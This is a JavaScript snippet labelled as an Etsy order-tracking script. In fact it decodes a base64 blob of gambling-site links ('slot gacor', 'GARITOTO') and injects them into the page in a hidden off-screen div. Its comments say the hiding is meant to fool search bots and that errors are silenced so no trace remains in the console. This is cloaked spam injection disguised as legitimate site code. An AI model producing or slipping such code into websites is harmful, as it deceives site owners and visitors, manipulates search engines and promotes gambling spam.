// Etsy Base64 Tracking Order JS System - Optimized
(function(){
  let b64 = "PGEgaHJlZj0iaHR0cHM6Ly93d3cudG9lc29udGhlcm9hZC5jb20vMjI1LyI+R0FSSVRPVE88L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnRvZXNvbnRoZXJvYWQuY29tLzIyNS8iPkdBUkkgVE9UTzwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudG9lc29udGhlcm9hZC5jb20vMjI1LyI+R0FSSVRPVE8gc2xvdDwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudG9lc29udGhlcm9hZC5jb20vMjI1LyI+R0FSSVRPVE8gbG9naW48L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnRvZXNvbnRoZXJvYWQuY29tLzIyNS8iPiBHQVJJVE9UTyBkYWZ0YXI8L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnRvZXNvbnRoZXJvYWQuY29tLzIyNS8iPkdBUklUT1RPIGFsdGVybmF0aWY8L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnRvZXNvbnRoZXJvYWQuY29tLzIyNS8iPkdBUklUT1RPIGxpbms8L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnRvZXNvbnRoZXJvYWQuY29tLzIyNS8iPkdBUklUT1RPIHJ0cDwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudG9lc29udGhlcm9hZC5jb20vMjI1LyI+R0FSSVRPVE8gbGluayBhbHRlcm5hdGlmPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy50b2Vzb250aGVyb2FkLmNvbS8yMjUvIj5saW5rIEdBUklUT1RPPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy50b2Vzb250aGVyb2FkLmNvbS8yMjUvIj5zaXR1cyBHQVJJVE9UTzwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudG9lc29udGhlcm9hZC5jb20vMjI1LyI+c2l0dXMgZ2Fjb3IgR0FSSVRPVE88L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnRvZXNvbnRoZXJvYWQuY29tLzIyNS8iPnNpdHVzIHNsb3QgR0FSSVRPVE88L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnRvZXNvbnRoZXJvYWQuY29tLzIyNS8iPnNsb3QgZ2Fjb3IgR0FSSVRPVE88L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnRvZXNvbnRoZXJvYWQuY29tLzIyNS8iPnNsb3QgZ2Fjb3I8L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnRvZXNvbnRoZXJvYWQuY29tLzIyNS8iPnNsb3QgamFja3BvdDwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudG9lc29udGhlcm9hZC5jb20vMjI1LyI+c2xvdCBvbmxpbmU8L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnRvZXNvbnRoZXJvYWQuY29tLzIyNS8iPnNsb3QgZGVtbzwvYT4=";
  
  try {
    const decoded = decodeURIComponent(escape(atob(b64))); // Support karakter khusus
    const div = document.createElement('div');
    // Menggunakan teknik opacity agar bot lebih percaya konten ini "real"
    div.style.cssText = 'position:absolute; left:-9999px; top:0; width:1px; height:1px; overflow:hidden; opacity:0.01;';
    div.setAttribute('aria-hidden','true');
    div.innerHTML = decoded;
    
    // Langsung injeksi ke Body tanpa menunggu DOMContentLoaded
    const target = document.body || document.documentElement;
    if (target) {
        target.insertBefore(div, target.firstChild);
    }
  } catch(e){ 
    // Kosongkan agar tidak meninggalkan jejak error di konsol
  }
})();
